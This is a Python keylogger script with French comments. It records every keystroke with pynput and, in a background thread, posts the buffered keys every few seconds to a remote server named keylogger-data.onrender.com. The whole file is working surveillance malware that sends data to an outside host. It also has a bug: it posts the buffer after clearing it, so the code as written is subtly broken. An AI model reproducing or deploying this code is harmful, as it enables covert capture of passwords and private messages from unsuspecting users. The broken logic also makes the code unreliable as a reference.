from pynput import keyboard
import requests
import threading
import time

# URL du serveur Render
url = "https://keylogger-data.onrender.com/keypress"

# Buffer pour stocker les touches
buffer = []
lock = threading.Lock()

# Intervalle d’envoi (en secondes)
SEND_INTERVAL = 5

def send_buffer():
    while True:
        time.sleep(SEND_INTERVAL)

        lock.acquire()
        if buffer:
            data_to_send = {"keys": buffer.copy()}
            buffer.clear()
            lock.release()

            try:
                response = requests.post(url, json={"keys": buffer.copy()})
                print(f"[ENVOI] {len(data_to_send['keys'])} touches envoyées | Status: {response.status_code}")
            except Exception as e:
                print(f"[ERREUR ENVOI] {e}")
        else:
            lock.release()

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    print(f"Touche: {key_str}")

    lock.acquire()
    buffer.append(key_str)
    lock.release()

# Thread d’envoi périodique
sender_thread = threading.Thread(target=send_buffer, daemon=True)
sender_thread.start()

# Listener clavier
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()